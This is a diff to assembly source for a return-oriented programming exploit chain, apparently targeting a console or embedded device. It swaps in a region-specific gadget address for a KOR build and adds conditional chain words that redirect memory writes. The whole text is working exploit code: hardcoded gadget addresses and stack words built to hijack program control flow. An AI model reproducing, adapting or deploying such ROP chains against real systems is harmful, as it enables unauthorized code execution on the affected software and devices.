@@ -146,7 +146,7 @@
 #define ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC 0x174de8 //"str r4, [r0, #0x2b0]" "pop {r4, r5, r6, pc}"
 #else//KOR
 #define REGPOPADR 0x1888a4
-#define ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC 0x22426c
+#define ROP_WRITER6_TOR0_x1c_POPR4R5R6PC 0x121de0
 #define REGPOP24ADR 0x100590
 #define STACKMEMCPYADR 0x25a080
 
@@ -776,14 +776,22 @@ gxcpy_appmemtype_ropword:
 .word ADDSHIFTVAL_BLXR3 @ r4 = r0 + r1<<2. classptr = *(r5+0x38). Calls vtable funcptr +16 with r3 for the funcptr, r2=*r4, r1=<ptr loaded from pool>
 
 @ Write r4 to gxcpy_appmemsizeptr_ropword.
+#if REGION!=3//Non-KOR
 .word ((gxcpy_appmemsizeptr_ropword-_start) + SAVEADR) - 0x2b0 @ r0
+#else//KOR
+.word ((gxcpy_appmemsizeptr_ropword-_start) + SAVEADR) - 0x1c @ r0
+#endif
 .word 0 @ r1
 .word 0 @ r2
 .word 0 @ r3
 .word 0 @ sl
 .word 0 @ ip
 
+#if REGION!=3//Non-KOR
 .word ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC @ "str r4, [r0, #0x2b0]" "pop {r4, r5, r6, pc}"
+#else//KOR
+.word ROP_WRITER6_TOR0_x1c_POPR4R5R6PC @ "str r6, [r0, #0x1c]" "pop {r4, r5, r6, pc}"
+#endif
 
 .word 0 @ r4
 .word 0 @ r5
